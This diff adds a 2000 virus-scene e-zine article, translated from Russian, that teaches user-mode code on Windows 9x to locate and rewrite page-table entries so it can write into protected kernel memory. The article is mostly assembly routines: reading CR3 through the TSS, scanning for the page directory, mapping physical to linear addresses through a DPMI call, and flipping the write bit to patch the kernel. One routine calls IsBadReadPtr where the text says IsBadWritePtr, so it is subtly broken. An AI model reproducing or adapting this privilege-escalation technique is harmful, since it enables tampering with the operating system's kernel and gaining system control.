@@ -1,0 +1,397 @@
+
+            WRITING INTO KERNEL FROM RING-3: LETS FUCK PAGETABLE
+            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+                  xlated from russian for MATRiX #2 E-Zine
+                              (x) 2000 Z0MBiE
+
+  WARNING #1.
+  Before reading this text, it is strongly recommended to read some
+  documentation about page table, protected mode, memory organisation, etc.
+
+[*] PREFACE
+
+  Here will be described a method of writing into any region of memory
+  from ring3 by means of pagetable modification.
+
+  Our task is to write data into some virtual (linear) address X.
+  And let the write-protected memory page that contains address X
+  will be called PageX.
+
+[*] getting access rights to address X
+
+  It is possible to get information about our access rights to address X
+  in the following ways:
+
+  1. call win32 api: IsBadXXXPtr (XXX=Read,Write,Code,etc.)
+  2. use SEH
+
+  1. IsBadXXXPtr
+                        push    size-in-bytes
+                        push    address
+                        call    IsBadReadPtr
+                        or      eax, eax
+                        jnz     __can_not_read
+__can_read:             ...
+
+  2. SEH
+                        call    __seh_init
+                        mov     esp, [esp+8]
+                        stc
+                        jmp     __seh_exit
+__seh_init:             push    dword ptr fs:[0]
+                        mov     fs:[0], esp
+
+                        mov     al, byte ptr [address]
+                        clc
+
+__seh_exit:             pop     dword ptr fs:[0]
+                        pop     eax
+
+                        jc      __can_not_read
+__can_read:             ...
+
+  Btw, IsBadXXXPtr functions (in win9X at least) uses SEH method too,
+  so their execution with the same result just takes more time.
+
+  So, now we know how to find if PageX is write-protected
+
+[*] Page Table format
+
+  What is page table?
+  All physical memory is divided into 4k-pages, which may be:
+  read/write-protected and mapped into linear 4GB-length address space.
+  Information about all this shit is stored in the page table.
+
+                                Page Table:
+                                ~~~~~~~~~~~
+
+ 1st-level directory page             1024 x                physical memory
+ aka Page Directory          2nd-level directory pages          pages
+
+   single 4k-page,       totally 1024*1024 DWORD-descriptors,
+ physical addr in CR3    for any 4k page in 4GB address space
+
+  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿               ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
+  ³ DWORD #0    Ã-------------->³ ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿           ÚÄÄÄÄÄÄÄÄÄÄÄ¿
+  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄ´               ÃÄ³ DWORD #0   ³---------->³ ...       ³
+  ³ DWORD #1    Ã---------------->ÃÄÄÄÄÄÄÄÄÄÄÄÄ´           ÀÄÄÄÄÄÄÄÄÄÄÄÙ
+  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄ´               ÃÄ³ DWORD #1   ³---------->ÚÄÄÄÄÄÄÄÄÄÄÄ¿
+  : ...         :               : ÃÄÄÄÄÄÄÄÄÄÄÄÄ´           ³ ...       ³
+  : ...         :               : : ...        :           ÀÄÄÄÄÄÄÄÄÄÄÄÙ
+  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄ´               ³ : ...ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
+  ³ DWORD #1023 Ã--------------------->³ DWORD #0   ³-------> ...
+  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÙ               ÀÄ³    ÃÄÄÄÄÄÄÄÄÄÄÄÄ´
+                                  ÀÄÄÄÄ³ DWORD #1   ³-------> ...
+                                       ÃÄÄÄÄÄÄÄÄÄÄÄÄ´
+                                       : ...        :
+                                       : ...        :
+                                       ÃÄÄÄÄÄÄÄÄÄÄÄÄ´
+                                       ³ DWORD #1023³-------> ...
+                                       ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+  Each DWORD has the following format:
+  (to find more details see documentation)
+
+ 31                           12 11                    0
+---------------------------------------------------------
+|                               |     |   | | |P|P|U|R| |
+|     physical address   31..12 |AVAIL|0 0|D|A|C|W|/|/|P|
+|                               |     |   | | |D|T|S|W| |
+---------------------------------------------------------
+
+P        - present (if P=0, all other data is unused and the corresponding
+                    page is absent in linear address space)
+
+R/W      - read/write                               -- bit 1 (0x02)
+U/S      - user/supervisor                          -- bit 2 (0x04)
+
+[*] finding pagetable: variant 1
+
+  High 20 bits of the CR3 register is a physycal address of the page table,
+  low 12 bits are zero (it just means that pagetable base is 4k-aligned).
+
+  But, if you will use 'MOV EAX, CR3' instruction, you will suck.
+  This is because it is a privileged instruction, which may not be
+  called from ring-3.
+  Indeed, win9X will not generate an exception in this situation, but,
+  it will not modify EAX too.
+
+  Now we may think a little, and find out, that copy of the CR3 register
+  (for the current context!) is stored in the TSS.
+
+  Where to find TSS?
+  TSS selector may be found using STR (Store Task Register) command.
+
+  So, we know everything to find CR3 register value.
+
+; subroutine: get_cr3
+; output:     EBX=CR3
+
+get_cr3:                push    eax
+
+                        sgdt    [esp-6]
+                        mov     ebx, [esp-4]    ; EBX<--GDT.base
+
+                        str     ax              ; EAX<--TSS selector
+                        and     eax, 0FFF8h     ; optionally
+
+                        add     ebx, eax        ; EBX<--TSS descriptor offset
+
+                        mov     ah, [ebx+7]     ; EAX<--TSS linear address
+                        mov     al, [ebx+4]
+                        shl     eax, 16
+                        mov     ax, [ebx+2]
+
+                        mov     ebx, [eax+1Ch]  ; EBX<--CR3
+                        and     ebx, 0FFFFF000h ; EBX<--pagetable phys. offs
+
+                        pop     eax
+                        ret
+
+  Btw, if you will change 'mov ebx, [eax+1Ch]' into 'mov ebx, [eax+4]' in
+  the code shown above, you will get ESP0, i.e. ESP of the code, that
+  has called current task.
+
+  So, now we have CR3 register value, which is physical address of the
+  page table.
+
+  But how can we use this fucking physical address in the PE file?
+  Of course, in the ring-0 it may be converted into linear address
+  using VxDcalls, but in the win32 api there are no such api functions...
+
+[*] finding pagetable: variant 2
+
+  Now lets try to find pagetable in memory.
+
+  We will search not the first-level directory page,
+  but that second-level directory page,
+  that contains DWORD which describes PageX.
+
+  What do we know about this second-level page? Seems nothing.
+
+  But, life is not so bad. Above-mentioned IsBadReadPtr function can
+  tell us, is some address readable or not. (a whole bit!)
+  And each DWORD-element in the second-level directory page has U/S bitflag,
+  which has the same meaning. ;-)
+  And there are another bit (R/W) which determines writeability of the
+  memory page, which may be found using IsBadWritePtr function.
+
+                ring-3 function     flags in the page descriptor
+  read          IsBadReadPtr        U/S  user/supervisor
+  write         IsBadWritePtr       R/W  read/write
+
+  So, calling IsBadRead/WritePtr functions for 1024 different pages we can
+  generate 1024 DWORDs, and each DWORD will contain the same 2 bits,
+  as in the 2nd-level directory page.
+
+  After that we will scan all the memory (really C0000000..D0000000),
+  comparing each memory page to our generated page,
+  but checking only these 2 bits in each DWORD.
+
+needtbl                 dd      1024 dup (?)
+
+; subroutine: find_kernel_pagetable
+; return:     EBX=2ndlevel directory page (for addresses BFC00000...C0000000)
+
+find_kernel_pagetable:
+
+; create page of DWORDs (with 2 meaningful bits in each DWORD)
+
+                        lea     edi, needtbl    ; page of DWORDs
+                        cld
+
+                        mov     esi, 0BFC00000h ; ESI--starting page
+
+__maketbl:              xor     ebp, ebp
+
+                        push    4096
+                        push    esi
+                        callW   IsBadReadPtr
+
+                        xor     eax, 1          ; 0 <--> 1
+                        shl     eax, 2          ; 1 --> 4
+                        or      ebp, eax
+
+                        push    4096
+                        push    esi
+                        callW   IsBadReadPtr
+
+                        xor     eax, 1          ; 0 <--> 1
+                        shl     eax, 1          ; 1 --> 2
+                        or      eax, ebp
+
+                        stosd
+
+                        add     esi, 4096       ; +1 page
+                        cmp     esi, 0C0000000h ; totally 1024 pages
+                        jne     __maketbl
+
+; find 2nd-level directory page
+
+                        mov     ebx, 0C0000000h   ; start address
+__cycle:
+                        push    4096              ; is current page readable?
+                        push    ebx
+                        callW   IsBadReadPtr
+                        or      eax, eax
+                        jnz     __cont
+
+                        xor     edi, edi          ; compare pages
+
+__scan:                 mov     eax, [ebx+edi]
+                        and     eax, 2+4    ; only 2 bits has meaning for us
+                        xor     eax, needtbl[edi] ; compare
+                        jnz     __cont
+
+                        add     edi, 4
+                        cmp     edi, 4096
+                        jb      __scan
+
+                        clc                       ; found!
+                        ret
+
+__cont:                 add     ebx, 4096         ; +1 page
+                        cmp     ebx, 0D0000000h   ; end-address
+                        jb      __cycle
+
+                        stc                       ; not found...
+                        ret
+
+  So, we have found 2nd level directory page which describes
+  1024 pages in [BFC00000...C0000000] range.
+
+  Now, if we wanna change RW bit for address BFF70000 we do the following:
+
+                        ; find 2nd level directory page
+                        call    find_kernel_pagetable
+                        jc      __damnedsonofabitch
+
+                        ; clear protection (make page writeable)
+                        c1 = (0BFF70000h-0BFC00000h)/1024
+                        or      dword ptr [ebx + c1], 2  ; RW=1
+
+                        ; check if all okey, if page really became writeable
+                        push    4096
+                        push    0BFF70000h
+                        call    IsBadReadPtr
+                        or      eax, eax
+                        jnz     __exit
+
+                        ; fuck the kernel
+                        not     dword ptr ds:[0BFF70000h]
+
+                        ; restore protection
+                        and     dword ptr [ebx + c1], not 2  ; RW=0
+
+  Now you may ask me: why did u used BFC00000 and C0000000 constants in
+  the example above?
+  This numbers are BFF70000 address, rounded up and down to the 4MB range.
+
+[*] damned shit
+
+  Maybe you think, we've just patched kernel? No. This really sucks.
+  As it were found, the fucking 2nd-level directory page is just ABSENT
+  in the current context, by default.
+  So you really will find nothing.
+  But, under fucking Soft-ICE all works. This is because it commits this
+  2ndlevel page into current context, performing something like this:
+
+                        push    0
+                        push    4096
+                        push    physical-page-offset
+                        VMMcall MapPhysToLinear
+                        add     esp,3*4
+
+  And fucking VMM_MapPhysToLinear calls first VMM_PageReserve and then
+  VMM_LinPageLock, in such way allocating new page in the current context
+  and mapping physical page there.
+
+  So, we may find pagetable only if it is loaded into current context.
+
+[*] finding pagetable: back to variant 1
+
+  So, we have the following trouble: 2nd-level directory page may not be
+  found, because it is absent in the current context.
+
+  Solution may be the following:
+  1. try to find this fucking page in the different contexts
+  2. map this page into current context
+
+  2nd variant seems better, so, question:
+  how to convert physical address into linear without entering ring-0?
+
+  And here it is.
+
+KERNEL@ORD0             dd      0BFF713D4h      ; surely, it may be found
+
+; subroutine: phys2linear
+; input:      EBX=physical address
+; output:     EBX=linear address
+
+phys2linear:            pusha
+
+                        movzx   ecx, bx         ; BX:CX<--EBX=phys addr
+                        shr     ebx, 16
+
+                        mov     eax, 0800h      ; physical address mapping
+
+                        xor     esi, esi        ; SI:DI=size (1 byte)
+                        xor     edi, edi
+                        inc     edi
+
+                        push    ecx
+                        push    eax
+                        push    0002A0029h      ; INT 31 (DPMI services)
+                        call    KERNEL@ORD0
+
+                        shl     ebx, 16         ; EBX<--BX:CX=linear address
+                        or      ebx, ecx
+
+                        mov     [esp+4*4], ebx  ; popa.ebx
+
+                        popa
+                        ret
+
+  So, now we know CR3 value and may xlate it into linear address.
+
+; subroutine: get_pagetable_entry
+; input:      ESI=address
+; output:     EDI=pagetable entry address
+
+get_pagetable_entry:    pusha
+
+                        call    get_cr3         ; take CR3
+                        and     ebx, 0FFFFF000h ; EBX<--pagetable phys. addr
+
+                        call    phys2linear     ; EBX<--pagetable linear addr
+
+                        mov     eax, esi
+                        and     eax, 0FFC00000h
+                        sub     esi, eax
+                        shr     eax, 20       ; EAX<--1st-level dir page
+                        shr     esi, 10       ; ESI<--2nd-level dir page
+
+                        mov     ebx, [ebx+eax]  ; EBX<--physical address
+                        and     ebx, 0FFFFF000h ; of the needed page
+
+                        call    phys2linear   ; EBX<--linear address
+
+                        add     esi, ebx      ; ESI<--DWORD to patch
+
+                        mov     [esp], esi    ; popa.edi
+                        popa
+                        ret
+
+  And, at last, all this shit may be used as this:
+
+                        mov     esi, 0BFF70000H
+                        call    get_pagetable_entry
+                        or      dword ptr [edi], 2  ; PAGEFLAG_RW
+                        ...
+                        mov     byte ptr [esi], xxxx  ; fuckup kernel
+                        ...
+                        and     dword ptr [edi], not 2
+
+        Thats all!
+                                   * * *
